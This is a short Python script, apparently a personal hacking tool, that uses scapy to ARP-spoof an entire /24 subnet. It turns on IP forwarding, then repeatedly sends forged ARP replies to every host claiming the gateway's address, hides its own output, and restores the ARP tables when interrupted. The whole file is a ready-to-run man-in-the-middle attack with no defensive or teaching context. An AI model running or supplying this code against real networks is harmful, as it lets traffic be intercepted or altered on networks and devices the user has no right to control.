from scapy.all import Ether, ARP, srp, send
#coded by 0xbit
import time
import os
import sys
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def enable_ip_route():
    if "nt" in os.name:
        from services import WService
        service = WService("RemoteAccess")
        service.start()
    else:
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path, "w") as f:
            f.write("1")

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def get_all_ips(subnet):
    ip_prefix = ".".join(subnet.split(".")[:-1])
    return [f"{ip_prefix}.{i}" for i in range(1, 255)]

def spoof_subnet(target_subnet, gateway_ip):
    target_ips = get_all_ips(target_subnet)
    gateway_mac = get_mac(gateway_ip)
    for target_ip in target_ips:
        arp_response = ARP(pdst=target_ip, hwdst=gateway_mac, psrc=gateway_ip, op='is-at')
        send(arp_response, verbose=0)
        
def restore_subnet(target_subnet, gateway_ip):
    target_ips = get_all_ips(target_subnet)
    gateway_mac = get_mac(gateway_ip)
    for target_ip in target_ips:
        arp_response = ARP(pdst=target_ip, hwdst=gateway_mac, psrc=gateway_ip, hwsrc=gateway_mac, op="is-at")
        send(arp_response, verbose=0, count=7)

if __name__ == "__main__":
    target_subnet = "10.0.0.0/24"
    gateway_ip = "10.0.0.1"
    verbose = True
    enable_ip_route()
    try:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        
        while True:
            spoof_subnet(target_subnet, gateway_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        restore_subnet(target_subnet, gateway_ip)
    finally:
        sys.stdout = sys.__stdout__
        sys.stderr = sys.__stderr__
